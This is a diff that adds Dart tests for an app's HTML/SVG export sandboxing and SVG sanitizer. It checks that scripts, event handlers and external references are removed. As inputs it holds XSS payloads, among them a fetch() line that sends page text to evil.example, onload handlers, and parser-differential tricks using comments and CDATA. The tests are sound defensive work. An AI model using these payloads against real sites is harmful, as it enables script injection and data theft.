@@ -142,6 +142,37 @@ void main() {
     expect(md, contains('![Figure 1](figures/figure-1.svg)'));
   });
 
+  test('downloads keep the sandbox and the sanitizer; Copy keeps the source', () async {
+    const page = '<script>fetch("https://evil.example/?d="+document.body.innerText)</script><p>hi</p>';
+    final html = Visual.fromPart(
+      _call('create_artifact', {'id': 'a', 'kind': 'html', 'title': 'Page', 'content': page}, 'h'),
+    )!;
+    final saved = utf8.decode(await downloadsOf(html).single.build());
+    expect(saved, startsWith('<!doctype html>'));
+    expect(saved.indexOf('Content-Security-Policy'), lessThan(saved.indexOf('<iframe')));
+    expect(saved, contains('sandbox="allow-scripts"'));
+    expect(saved, isNot(contains('<script>fetch')), reason: 'the page is only inside the escaped srcdoc');
+    expect(exportOf(html).text, page);
+
+    const bad =
+        '<svg xmlns="http://www.w3.org/2000/svg" onload="steal()"><script>steal()</script>'
+        '<image href="https://evil.example/p.png"/><rect width="1" height="1"/></svg>';
+    final svg = Visual.fromPart(_call('render_svg', {'title': 'Fig', 'svg': bad}, 's'))!;
+    final svgFile = utf8.decode(await downloadsOf(svg).firstWhere((o) => o.extension == 'svg').build());
+    final doc = 'Text\n\n```svg\n$bad\n```\n';
+    final zip = ZipDecoder().decodeBytes(markdownZip(doc, 'r'));
+    for (final out in [
+      svgFile,
+      markdownWithInlineSvg(doc),
+      utf8.decode(zip.findFile('r/figures/figure-1.svg')!.content),
+    ]) {
+      expect(out, contains('<rect'));
+      expect(out, isNot(contains('<script')));
+      expect(out, isNot(contains('onload')));
+      expect(out, isNot(contains('evil.example')));
+    }
+  });
+
   test('word export is a valid package with the figure embedded', () async {
     final figures = await rasterizeAll(svgFiguresIn(_doc), _fakeRaster);
     final bytes = buildDocx(title: 'Report', blocks: parseDoc(_doc), figures: figures);
@@ -258,6 +289,27 @@ void main() {
     expect(clean, isNot(contains('onclick')));
     expect(clean, isNot(contains('evil.example')));
     expect(clean, contains('<rect'));
+  });
+
+  test('sanitizeSvg leaves nothing an HTML parser would bring to life', () {
+    const open = '<svg xmlns="http://www.w3.org/2000/svg">';
+    // XML keeps `--!>` inside the comment; HTML ends the comment there.
+    final comment = sanitizeSvg('$open<!-- a --!><img src=x onerror=alert(1)> --><rect/></svg>');
+    expect(comment, isNot(contains('onerror')));
+    expect(comment, contains('<rect/>'));
+    // Markup inside title/desc is HTML to a browser (`image` becomes `img`).
+    const input =
+        '$open<title>Chart<image src="https://evil.example/x?d=1" srcset="https://evil.example/y 1x"/></title>'
+        '<desc><![CDATA[<img src=x onerror=alert(1)>]]></desc>'
+        '<text><![CDATA[a < b]]></text><image src="https://evil.example/z" width="1"/></svg>';
+    final title = sanitizeSvg(input);
+    expect(title, isNot(contains('evil.example')));
+    expect(title, isNot(contains('<img')));
+    expect(title, isNot(contains('CDATA')));
+    expect(title, contains('<title>Chart</title>'));
+    expect(title, contains('<text>a &lt; b</text>'));
+    // A second call (the cache) gives the same answer.
+    expect(sanitizeSvg(input), title);
   });
 
   group('QuizView', () {
